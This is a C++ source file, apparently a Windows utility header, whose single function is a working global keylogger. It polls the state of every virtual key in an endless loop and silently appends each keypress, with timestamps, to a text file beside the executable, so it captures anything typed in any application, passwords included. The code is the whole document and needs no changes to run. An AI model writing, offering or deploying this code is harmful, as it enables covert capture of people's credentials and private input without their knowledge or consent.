#include "utils.hpp"

#ifdef WIN32
#define isKeyDown(vKey) ((GetAsyncKeyState(vKey) & 0x8000) ? 1:0)
#define KEY_COUNT (256)
#define PRINT_VK(VK) if (i == (VK)) { line = _T(" { ") _T(#VK) _T(" } "); printed = true; }

namespace utils {
    namespace device {
        namespace keyboard {
            inline void record(string_t journalFilePath, int inputIdleTimeout, int pollingMilliseconds) {
                if (!journalFilePath.empty()) {
                    FILE* file = nullptr;
                    _tfreopen_s(&file,
                        journalFilePath.c_str(),
                        PathFileExists(journalFilePath.c_str()) ? _T("rb+") : _T("w"),
                        stdout);
                    if (file) {
                        fseek(file, 0, SEEK_END);
                        bool keyboard[KEY_COUNT] = { 0 };
                        string_t line;
                        unsigned __int64 lastKeyDownTime = 0;
                        while (1) {
                            line.clear();
                            auto keydown = false;
                            for (auto i = 0; i < KEY_COUNT; i++) {
                                if (isKeyDown(i)) {
                                    keydown = true;
                                    if (!keyboard[i]) {
                                        keyboard[i] = true;
                                        if (i >= '0' && i <= '9') {
                                            line = strings::format(_T("%c"), (TCHAR)i);
                                        }
                                        else if (i >= 'A' && i <= 'Z') {
                                            line = strings::format(_T("%c"), (TCHAR)(i - 'A' + 'a'));
                                        }
                                        else if (i == VK_SPACE) {
                                            line = _T(" ");
                                        }
                                        else if (i == VK_OEM_PERIOD) {
                                            line = _T(".");
                                        }
                                        else {
                                            bool printed = false;
                                            PRINT_VK(VK_LBUTTON);
                                            PRINT_VK(VK_RBUTTON);
                                            PRINT_VK(VK_CANCEL);
                                            PRINT_VK(VK_MBUTTON);
                                            PRINT_VK(VK_XBUTTON1);
                                            PRINT_VK(VK_XBUTTON2);
                                            PRINT_VK(VK_BACK);
                                            PRINT_VK(VK_TAB);
                                            PRINT_VK(VK_CLEAR);
                                            PRINT_VK(VK_RETURN);
                                            PRINT_VK(VK_SHIFT);
                                            PRINT_VK(VK_CONTROL);
                                            PRINT_VK(VK_MENU);
                                            PRINT_VK(VK_PAUSE);
                                            PRINT_VK(VK_CAPITAL);
                                            PRINT_VK(VK_KANA);
                                            PRINT_VK(VK_HANGEUL);
                                            PRINT_VK(VK_HANGUL);
                                            PRINT_VK(VK_IME_ON);
                                            PRINT_VK(VK_JUNJA);
                                            PRINT_VK(VK_FINAL);
                                            PRINT_VK(VK_HANJA);
                                            PRINT_VK(VK_KANJI);
                                            PRINT_VK(VK_IME_OFF);
                                            PRINT_VK(VK_ESCAPE);
                                            PRINT_VK(VK_CONVERT);
                                            PRINT_VK(VK_NONCONVERT);
                                            PRINT_VK(VK_ACCEPT);
                                            PRINT_VK(VK_MODECHANGE);
                                            PRINT_VK(VK_SPACE);
                                            PRINT_VK(VK_PRIOR);
                                            PRINT_VK(VK_NEXT);
                                            PRINT_VK(VK_END);
                                            PRINT_VK(VK_HOME);
                                            PRINT_VK(VK_LEFT);
                                            PRINT_VK(VK_UP);
                                            PRINT_VK(VK_RIGHT);
                                            PRINT_VK(VK_DOWN);
                                            PRINT_VK(VK_SELECT);
                                            PRINT_VK(VK_PRINT);
                                            PRINT_VK(VK_EXECUTE);
                                            PRINT_VK(VK_SNAPSHOT);
                                            PRINT_VK(VK_INSERT);
                                            PRINT_VK(VK_DELETE);
                                            PRINT_VK(VK_HELP);
                                            PRINT_VK(VK_LWIN);
                                            PRINT_VK(VK_RWIN);
                                            PRINT_VK(VK_APPS);
                                            PRINT_VK(VK_SLEEP);
                                            PRINT_VK(VK_NUMPAD0);
                                            PRINT_VK(VK_NUMPAD1);
                                            PRINT_VK(VK_NUMPAD2);
                                            PRINT_VK(VK_NUMPAD3);
                                            PRINT_VK(VK_NUMPAD4);
                                            PRINT_VK(VK_NUMPAD5);
                                            PRINT_VK(VK_NUMPAD6);
                                            PRINT_VK(VK_NUMPAD7);
                                            PRINT_VK(VK_NUMPAD8);
                                            PRINT_VK(VK_NUMPAD9);
                                            PRINT_VK(VK_MULTIPLY);
                                            PRINT_VK(VK_ADD);
                                            PRINT_VK(VK_SEPARATOR);
                                            PRINT_VK(VK_SUBTRACT);
                                            PRINT_VK(VK_DECIMAL);
                                            PRINT_VK(VK_DIVIDE);
                                            PRINT_VK(VK_F1);
                                            PRINT_VK(VK_F2);
                                            PRINT_VK(VK_F3);
                                            PRINT_VK(VK_F4);
                                            PRINT_VK(VK_F5);
                                            PRINT_VK(VK_F6);
                                            PRINT_VK(VK_F7);
                                            PRINT_VK(VK_F8);
                                            PRINT_VK(VK_F9);
                                            PRINT_VK(VK_F10);
                                            PRINT_VK(VK_F11);
                                            PRINT_VK(VK_F12);
                                            PRINT_VK(VK_F13);
                                            PRINT_VK(VK_F14);
                                            PRINT_VK(VK_F15);
                                            PRINT_VK(VK_F16);
                                            PRINT_VK(VK_F17);
                                            PRINT_VK(VK_F18);
                                            PRINT_VK(VK_F19);
                                            PRINT_VK(VK_F20);
                                            PRINT_VK(VK_F21);
                                            PRINT_VK(VK_F22);
                                            PRINT_VK(VK_F23);
                                            PRINT_VK(VK_F24);
                                            PRINT_VK(VK_NAVIGATION_VIEW);
                                            PRINT_VK(VK_NAVIGATION_MENU);
                                            PRINT_VK(VK_NAVIGATION_UP);
                                            PRINT_VK(VK_NAVIGATION_DOWN);
                                            PRINT_VK(VK_NAVIGATION_LEFT);
                                            PRINT_VK(VK_NAVIGATION_RIGHT);
                                            PRINT_VK(VK_NAVIGATION_ACCEPT);
                                            PRINT_VK(VK_NAVIGATION_CANCEL);
                                            PRINT_VK(VK_NUMLOCK);
                                            PRINT_VK(VK_SCROLL);
                                            PRINT_VK(VK_OEM_NEC_EQUAL);
                                            PRINT_VK(VK_OEM_FJ_JISHO);
                                            PRINT_VK(VK_OEM_FJ_MASSHOU);
                                            PRINT_VK(VK_OEM_FJ_TOUROKU);
                                            PRINT_VK(VK_OEM_FJ_LOYA);
                                            PRINT_VK(VK_OEM_FJ_ROYA);
                                            PRINT_VK(VK_LSHIFT);
                                            PRINT_VK(VK_RSHIFT);
                                            PRINT_VK(VK_LCONTROL);
                                            PRINT_VK(VK_RCONTROL);
                                            PRINT_VK(VK_LMENU);
                                            PRINT_VK(VK_RMENU);
                                            PRINT_VK(VK_BROWSER_BACK);
                                            PRINT_VK(VK_BROWSER_FORWARD);
                                            PRINT_VK(VK_BROWSER_REFRESH);
                                            PRINT_VK(VK_BROWSER_STOP);
                                            PRINT_VK(VK_BROWSER_SEARCH);
                                            PRINT_VK(VK_BROWSER_FAVORITES);
                                            PRINT_VK(VK_BROWSER_HOME);
                                            PRINT_VK(VK_VOLUME_MUTE);
                                            PRINT_VK(VK_VOLUME_DOWN);
                                            PRINT_VK(VK_VOLUME_UP);
                                            PRINT_VK(VK_MEDIA_NEXT_TRACK);
                                            PRINT_VK(VK_MEDIA_PREV_TRACK);
                                            PRINT_VK(VK_MEDIA_STOP);
                                            PRINT_VK(VK_MEDIA_PLAY_PAUSE);
                                            PRINT_VK(VK_LAUNCH_MAIL);
                                            PRINT_VK(VK_LAUNCH_MEDIA_SELECT);
                                            PRINT_VK(VK_LAUNCH_APP1);
                                            PRINT_VK(VK_LAUNCH_APP2);
                                            PRINT_VK(VK_OEM_1);
                                            PRINT_VK(VK_OEM_PLUS);
                                            PRINT_VK(VK_OEM_COMMA);
                                            PRINT_VK(VK_OEM_MINUS);
                                            PRINT_VK(VK_OEM_PERIOD);
                                            PRINT_VK(VK_OEM_2);
                                            PRINT_VK(VK_OEM_3);
                                            PRINT_VK(VK_GAMEPAD_A);
                                            PRINT_VK(VK_GAMEPAD_B);
                                            PRINT_VK(VK_GAMEPAD_X);
                                            PRINT_VK(VK_GAMEPAD_Y);
                                            PRINT_VK(VK_GAMEPAD_RIGHT_SHOULDER);
                                            PRINT_VK(VK_GAMEPAD_LEFT_SHOULDER);
                                            PRINT_VK(VK_GAMEPAD_LEFT_TRIGGER);
                                            PRINT_VK(VK_GAMEPAD_RIGHT_TRIGGER);
                                            PRINT_VK(VK_GAMEPAD_DPAD_UP);
                                            PRINT_VK(VK_GAMEPAD_DPAD_DOWN);
                                            PRINT_VK(VK_GAMEPAD_DPAD_LEFT);
                                            PRINT_VK(VK_GAMEPAD_DPAD_RIGHT);
                                            PRINT_VK(VK_GAMEPAD_MENU);
                                            PRINT_VK(VK_GAMEPAD_VIEW);
                                            PRINT_VK(VK_GAMEPAD_LEFT_THUMBSTICK_BUTTON);
                                            PRINT_VK(VK_GAMEPAD_RIGHT_THUMBSTICK_BUTTON);
                                            PRINT_VK(VK_GAMEPAD_LEFT_THUMBSTICK_UP);
                                            PRINT_VK(VK_GAMEPAD_LEFT_THUMBSTICK_DOWN);
                                            PRINT_VK(VK_GAMEPAD_LEFT_THUMBSTICK_RIGHT);
                                            PRINT_VK(VK_GAMEPAD_LEFT_THUMBSTICK_LEFT);
                                            PRINT_VK(VK_GAMEPAD_RIGHT_THUMBSTICK_UP);
                                            PRINT_VK(VK_GAMEPAD_RIGHT_THUMBSTICK_DOWN);
                                            PRINT_VK(VK_GAMEPAD_RIGHT_THUMBSTICK_RIGHT);
                                            PRINT_VK(VK_GAMEPAD_RIGHT_THUMBSTICK_LEFT);
                                            PRINT_VK(VK_OEM_4);
                                            PRINT_VK(VK_OEM_5);
                                            PRINT_VK(VK_OEM_6);
                                            PRINT_VK(VK_OEM_7);
                                            PRINT_VK(VK_OEM_8);
                                            PRINT_VK(VK_OEM_AX);
                                            PRINT_VK(VK_OEM_102);
                                            PRINT_VK(VK_ICO_HELP);
                                            PRINT_VK(VK_ICO_00);
                                            PRINT_VK(VK_PROCESSKEY);
                                            PRINT_VK(VK_ICO_CLEAR);
                                            PRINT_VK(VK_PACKET);
                                            PRINT_VK(VK_OEM_RESET);
                                            PRINT_VK(VK_OEM_JUMP);
                                            PRINT_VK(VK_OEM_PA1);
                                            PRINT_VK(VK_OEM_PA2);
                                            PRINT_VK(VK_OEM_PA3);
                                            PRINT_VK(VK_OEM_WSCTRL);
                                            PRINT_VK(VK_OEM_CUSEL);
                                            PRINT_VK(VK_OEM_ATTN);
                                            PRINT_VK(VK_OEM_FINISH);
                                            PRINT_VK(VK_OEM_COPY);
                                            PRINT_VK(VK_OEM_AUTO);
                                            PRINT_VK(VK_OEM_ENLW);
                                            PRINT_VK(VK_OEM_BACKTAB);
                                            PRINT_VK(VK_ATTN);
                                            PRINT_VK(VK_CRSEL);
                                            PRINT_VK(VK_EXSEL);
                                            PRINT_VK(VK_EREOF);
                                            PRINT_VK(VK_PLAY);
                                            PRINT_VK(VK_ZOOM);
                                            PRINT_VK(VK_NONAME);
                                            PRINT_VK(VK_PA1);
                                            PRINT_VK(VK_OEM_CLEAR);
                                            PRINT_VK(VK_LCONTROL);
                                            if (!printed) {
                                                line = strings::format(_T("0x%02x"), i);
                                            }
                                        }
                                    }
                                }
                                else {
                                    keyboard[i] = false;
                                }
                            }
                            if (!line.empty()) {
                                string_t out = line;
                                if (GetTickCount64() - lastKeyDownTime >= inputIdleTimeout) {
                                    out.clear();
                                    if (ftell(file) > 0) {
                                        out = strings::LF;
                                    }
                                    out += strings::format(_T("[%s] %s"), datetime::now().c_str(), line.c_str());
                                }
#ifdef UNICODE
                                std::string ansi = strings::t2s(out);
#else
                                std::string ansi = out;
#endif
                                fwrite(ansi.c_str(), sizeof(ansi.c_str()[0]), ansi.size(), file);
                                fflush(file);
                            }
                            if (keydown) {
                                lastKeyDownTime = GetTickCount64();
                            }
                            Sleep(pollingMilliseconds);
                        }
                        fclose(file);
                    }
                }
            }

            inline void record() {
                auto directory = io::path::GetExeFileDirectory();
                auto fileName = io::path::GetExeFileNameWithoutExtension();
                record(io::path::combine(directory, fileName + _T(".txt")), 1500, 10);
            }
        }
    }
}
#endif
